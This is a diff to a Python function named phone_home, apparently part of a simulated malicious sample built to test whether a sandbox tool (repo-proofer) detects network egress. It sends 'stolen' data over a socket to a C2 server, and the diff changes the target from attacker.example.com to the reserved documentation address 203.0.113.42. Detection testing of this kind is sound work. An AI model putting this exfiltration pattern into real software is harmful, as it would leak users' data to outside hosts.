@@ -70,15 +70,25 @@ def phone_home(payload: bytes) -> None:
     """Attempt to exfiltrate the stolen data to a C2 server.
 
     Under repo-proofer's --network none flag, this connect() call will
-    fail with ENETUNREACH or EAI_AGAIN. That failure IS the detection.
+    fail with ENETUNREACH. That failure IS the detection.
+
+    NOTE: We use a hardcoded IP (203.0.113.42, TEST-NET-3 reserved for
+    documentation) instead of a hostname. This is deliberate: under
+    --network none, DNS resolution fails BEFORE connect(), so a
+    hostname-based target would show up in the strace report as a DNS
+    query to the resolver (e.g. connect 192.168.65.7:53), not as the
+    actual C2 hostname. A hardcoded IP makes the connect() syscall
+    capture the real target, so the Runtime Behavior Report shows:
+        connect 203.0.113.42:443
+    which is the unambiguous egress-attempt signal.
     """
     print("CONNECTING", end="", flush=True)
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(5)
-        # attacker.example.com is a reserved domain that won't resolve
-        # under --network none. Even if it did, the firewall blocks it.
-        sock.connect(("attacker.example.com", 443))
+        # 203.0.113.0/24 is TEST-NET-3 (RFC 5737, reserved for docs).
+        # Under --network none the connect fails instantly with ENETUNREACH.
+        sock.connect(("203.0.113.42", 443))
         sock.sendall(b"QUANTUMGPT-NEO EXFIL\n" + payload)
         sock.close()
         print("... OK")
